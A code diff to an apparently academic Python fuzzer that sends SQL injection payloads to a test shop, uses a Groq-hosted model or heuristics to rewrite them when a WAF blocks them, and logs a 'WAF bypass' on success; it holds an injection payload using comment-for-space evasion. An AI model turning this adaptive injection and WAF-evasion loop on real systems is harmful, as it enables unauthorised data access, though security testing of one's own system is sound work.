@@ -34,8 +34,8 @@ def get_groq_api_key():
     if not key:
         env_paths = [
             Path(__file__).parent / ".env",
-            Path(__file__).parent.parent.parent / "Lan" / ".env",
-            Path("/Users/macbookpro/Documents/Nam_4/2_HK1/1_KiemThu/DoAn/eshop-sut/Lan/.env"),
+            Path(__file__).parent.parent.parent / "ai" / ".env",
+            Path("/Users/macbookpro/Documents/Nam_4/2_HK1/1_KiemThu/DoAn/eshop-sut/ai/.env"),
         ]
         for p in env_paths:
             if p.exists():
@@ -91,11 +91,29 @@ def heuristic_adaptation(blocked_reason: str, last_payload: str) -> str:
     return "1'/**/OR/**/'1'='1"
 
 class AIFuzzer:
-    def __init__(self, target_url: str = DEFAULT_TARGET, budget: int = DEFAULT_BUDGET, force_offline: bool = False):
+    def __init__(
+        self,
+        target_url: str = DEFAULT_TARGET,
+        budget: int = DEFAULT_BUDGET,
+        force_offline: bool = False,
+        sleep_seconds: float = 0.4,
+    ):
         self.target_url = target_url
         self.budget = budget
         self.api_key = None if force_offline else get_groq_api_key()
+        self.sleep_seconds = sleep_seconds
         self.logs = []
+
+    @staticmethod
+    def checkpoint_success(status: int, body: str) -> bool:
+        """Require a successful response with a non-empty backend result."""
+        if status != 200:
+            return False
+        try:
+            result = json.loads(body)
+        except json.JSONDecodeError:
+            return False
+        return isinstance(result, list) and bool(result)
 
     def send_request(self, payload: str):
         """Gửi test input đến server và đọc phản hồi từ WAF / Backend."""
@@ -153,8 +171,8 @@ class AIFuzzer:
             }
             self.logs.append(log_entry)
             
-            if not blocked and status == 200:
-                print(f"[✔] THÀNH CÔNG! Checkpoint đạt: Server phản hồi HTTP 200 OK.")
+            if not blocked and self.checkpoint_success(status, body):
+                print("[✔] THÀNH CÔNG! Checkpoint backend trả về dữ liệu không rỗng.")
                 print(f"[✔] Bộ lọc WAF bị bypass thích ứng thành công sau {attempts} requests!\n")
                 success = True
                 break
@@ -182,7 +200,8 @@ class AIFuzzer:
                 print(f"[💡 Heuristic Feedback] Phân tích chặn khoảng trắng -> Thay thế bằng /**/: {new_payload}")
             
             current_payload = new_payload
-            time.sleep(0.4)
+            if self.sleep_seconds:
+                time.sleep(self.sleep_seconds)
 
         result_data = {
             "is_replay": False,
